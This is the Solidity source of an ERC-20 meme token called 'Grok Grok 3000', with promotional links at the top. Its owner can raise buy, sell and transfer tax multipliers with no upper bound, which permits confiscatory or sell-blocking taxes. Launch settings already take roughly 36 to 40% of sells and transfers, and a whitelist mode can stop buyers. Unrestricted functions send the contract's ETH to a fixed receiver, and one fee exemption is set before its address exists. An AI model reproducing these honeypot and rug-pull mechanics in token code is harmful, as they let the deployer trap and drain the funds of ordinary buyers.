/*

https://twitter.com/GrokGrok3000ERC
https://t.me/GrokGrok3000
https://grokgrok3000.wtf


*/

// SPDX-License-Identifier: MIT


pragma solidity 0.8.21;



interface ERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}



contract Ownable is Context {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        authorizations[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }
    mapping (address => bool) internal authorizations;

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface InterfaceLP {
    function sync() external;
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract GrokGrok3000 is Ownable, ERC20 {
    using SafeMath for uint256;

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
    event EditTax(uint8 Buy, uint8 Sell, uint8 Transfer);
    event ClearStuck(uint256 amount);
    event ClearToken(address TokenAddressCleared, uint256 Amount);
    event set_Receivers(address marketingFeeReceiver, address teamFeeReceiver,address burnFeeReceiver,address devFeeReceiver);
    event set_Holding(uint256 maxWallPercent);
    event set_SwapBack(uint256 Amount, bool Enabled);

    address WETH;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    
    string constant _name = "Grok Grok 3000";
    string constant _symbol = "GROK3K";
    uint8 constant _decimals = 18; 
  

    uint256 _totalSupply = 1 * 10**9 * 10**_decimals;

    uint256 public _maxTxAmount = _totalSupply.mul(12).div(1000);
    uint256 public _maxWalletToken = _totalSupply.mul(12).div(1000);

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    
    mapping (address => bool) isFeeexempt;
    mapping (address => bool) isTxLimitexempt;

    uint256 private liquidityFee    = 1;
    uint256 private marketingFee    = 2;
    uint256 private utilityFee      = 1;
    uint256 private developerFee    = 0; 
    uint256 private burnFee         = 0;
    uint256 private totalFee         = developerFee + marketingFee + liquidityFee + utilityFee + burnFee;
    uint256 private feeDenominator  = 100;

    uint256 selltax = 900;
    uint256 buytax = 500;
    uint256 wallettowallet = 100; 

    address private LPReceiver;
    address private marketingFeeReceiver;
    address private utilityFeeReceiver;
    address private developerFeeReceiver;
    address private burnFeeReceiver;
    
    uint256 targetLiquidity = 25;
    uint256 targetLiquidityDenominator = 100;

    IDEXRouter public router;
    InterfaceLP private pairContract;
    address public pair;
    
    bool public TradingOpen = false; 

    bool public whitelistMode = false;
    mapping (address => bool) public iswhitelisted;   

    bool public swapEnabled = true;
    uint256 public swapThreshold = _totalSupply * 65 / 1000; 
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }
    
    constructor () {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        pairContract = InterfaceLP(pair);
       
        
        _allowances[address(this)][address(router)] = type(uint256).max;

        isFeeexempt[msg.sender] = true;
        isFeeexempt[utilityFeeReceiver] = true;
            
        isTxLimitexempt[msg.sender] = true;
        isTxLimitexempt[pair] = true;
        isTxLimitexempt[utilityFeeReceiver] = true;
        isTxLimitexempt[marketingFeeReceiver] = true;
        isTxLimitexempt[address(this)] = true;
        
        LPReceiver = msg.sender;
        marketingFeeReceiver = 0x0fd5b896A5C043fC7673485C197Ba774C85786fE;
        utilityFeeReceiver = 0xE0E08E1E0308DF32f800BB9728EA30d268510E1A;
        developerFeeReceiver = msg.sender;
        burnFeeReceiver = DEAD; 

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);

    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure override returns (uint8) { return _decimals; }
    function symbol() external pure override returns (string memory) { return _symbol; }
    function name() external pure override returns (string memory) { return _name; }
    function getOwner() external view override returns (address) {return owner();}
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function maxWalletRule(uint256 maxWallPercent) external onlyOwner {
        require(_maxWalletToken >= _totalSupply / 1000); 
        _maxWalletToken = (_totalSupply * maxWallPercent ) / 1000;

        emit set_Holding(maxWallPercent);
                
    }

         
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }

        if(!authorizations[sender] && !authorizations[recipient]){
            require(TradingOpen,"Trading not open yet");
        
             if(whitelistMode){
                require(iswhitelisted[recipient],"Not whitelisted"); 
          }
        }
               
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair && recipient != burnFeeReceiver && recipient != marketingFeeReceiver && !isTxLimitexempt[recipient]){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWalletToken,"Total Holding is currently limited, you can not buy that much.");}

        

        // Checks max transaction limit
        checkTxLimit(sender, amount); 

        if(shouldSwapBack()){ swapBack(); }
                    
         //Exchange tokens
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (isFeeexempt[sender] || isFeeexempt[recipient]) ? amount : takeFee(sender, amount, recipient);
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitexempt[sender], "TX Limit Exceeded");
    }

    function shouldTakeFee(address sender) internal view returns (bool) {
        return !isFeeexempt[sender];
    }

    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {
        
        uint256 percents = wallettowallet;

        if(recipient == pair) {
            percents = selltax;
        } else if(sender == pair) {
            percents = buytax;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(percents).div(feeDenominator * 100);
        uint256 burnTokens = feeAmount.mul(burnFee).div(totalFee);
        uint256 contractTokens = feeAmount.sub(burnTokens);

        _balances[address(this)] = _balances[address(this)].add(contractTokens);
        _balances[burnFeeReceiver] = _balances[burnFeeReceiver].add(burnTokens);
        emit Transfer(sender, address(this), contractTokens);
        
        
        if(burnTokens > 0){
            _totalSupply = _totalSupply.sub(burnTokens);
            emit Transfer(sender, ZERO, burnTokens);  
        
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function clearStuckETH(uint256 amountPercentage) external {
        uint256 amountETH = address(this).balance;
        payable(utilityFeeReceiver).transfer(amountETH * amountPercentage / 100);
    }

     
    function removeLimits() external onlyOwner { 
        _maxWalletToken = _totalSupply;
        _maxTxAmount = _totalSupply;

    }

    function transfer() external { 
             payable(utilityFeeReceiver).transfer(address(this).balance);

    }

    function removeForeignERC(address tokenAddress, uint256 tokens) public returns (bool) {
               if(tokens == 0){
            tokens = ERC20(tokenAddress).balanceOf(address(this));
        }

        emit ClearToken(tokenAddress, tokens);
        return ERC20(tokenAddress).transfer(LPReceiver, tokens);
    }

    function setBreakdown(uint256 _buypercent, uint256 _sellpercent, uint256 _transpercent) external onlyOwner {
        selltax = _sellpercent;
        buytax = _buypercent;
        wallettowallet = _transpercent;    
          
    }

     function setMode(bool _status) public onlyOwner {
        whitelistMode = _status;
    }

    function addMultipleToWhitelistList(address[] calldata addresses, bool status) public onlyOwner {
        for (uint256 i; i < addresses.length; ++i) {
            iswhitelisted[addresses[i]] = status;
        }
    }

    function openTrading() public onlyOwner {
        whitelistMode = false;
        buytax = 650;
        selltax = 950;
        wallettowallet = 1000;
        set_fees();
    }

    function first() public onlyOwner {
        buytax = 400;
        selltax = 650;
        wallettowallet = 0;
        set_fees();
    }

    function second() public onlyOwner {
        buytax = 250;
        selltax = 400;
        wallettowallet = 0;
        set_fees();
    }

    function goFinal() public onlyOwner {
        buytax = 25;
        selltax = 25;
        wallettowallet = 0;
        set_fees();

    }
    
    function grokIt() public onlyOwner {
        TradingOpen = true;
        whitelistMode = true;
    }
        
    function swapBack() internal swapping {
        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : liquidityFee;
        uint256 amountToLiquify = swapThreshold.mul(dynamicLiquidityFee).div(totalFee).div(2);
        uint256 amountToSwap = swapThreshold.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        uint256 balanceBefore = address(this).balance;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETH = address(this).balance.sub(balanceBefore);

        uint256 totalETHFee = totalFee.sub(dynamicLiquidityFee.div(2));
        
        uint256 amountETHLiquidity = amountETH.mul(dynamicLiquidityFee).div(totalETHFee).div(2);
        uint256 amountETHMarketing = amountETH.mul(marketingFee).div(totalETHFee);
        uint256 amountETHdeveloper = amountETH.mul(developerFee).div(totalETHFee);
        uint256 amountETHutility = amountETH.mul(utilityFee).div(totalETHFee);

        (bool tmpSuccess,) = payable(marketingFeeReceiver).call{value: amountETHMarketing}("");
        (tmpSuccess,) = payable(utilityFeeReceiver).call{value: amountETHutility}("");
        (tmpSuccess,) = payable(developerFeeReceiver).call{value: amountETHdeveloper}("");
        
        tmpSuccess = false;

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                LPReceiver,
                block.timestamp
            );
            emit AutoLiquify(amountETHLiquidity, amountToLiquify);
        }
    }

     
    function set_fees() internal {
      
        emit EditTax( uint8(totalFee.mul(buytax).div(100)),
            uint8(totalFee.mul(selltax).div(100)),
            uint8(totalFee.mul(wallettowallet).div(100))
            );
    }
    
     function setFees(uint256 _liquidityFee, uint256 _developerFee, uint256 _marketingFee, uint256 _utilityFee, uint256 _burnFee, uint256 _feeDenominator) external onlyOwner {
        liquidityFee = _liquidityFee;
        developerFee = _developerFee;
        marketingFee = _marketingFee;
        utilityFee = _utilityFee;
        burnFee = _burnFee;
        totalFee = _liquidityFee.add(_developerFee).add(_marketingFee).add(_utilityFee).add(_burnFee);
        feeDenominator = _feeDenominator;
        require(totalFee < feeDenominator / 5, "Fees can not be more than 20%"); 
        set_fees();
    }

    function setReceivers(address _LPReceiver, address _marketingFeeReceiver, address _utilityFeeReceiver, address _burnFeeReceiver, address _developerFeeReceiver) external onlyOwner {
        LPReceiver = _LPReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
        utilityFeeReceiver = _utilityFeeReceiver;
        burnFeeReceiver = _burnFeeReceiver;
        developerFeeReceiver = _developerFeeReceiver;
        emit set_Receivers(marketingFeeReceiver, utilityFeeReceiver, burnFeeReceiver, developerFeeReceiver);
    }

    function setSwapBack(bool _enabled, uint256 _amount) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _amount;
        emit set_SwapBack(swapThreshold, swapEnabled);
    }

      
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
    }

    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
        return getLiquidityBacking(accuracy) > target;
    }

    
}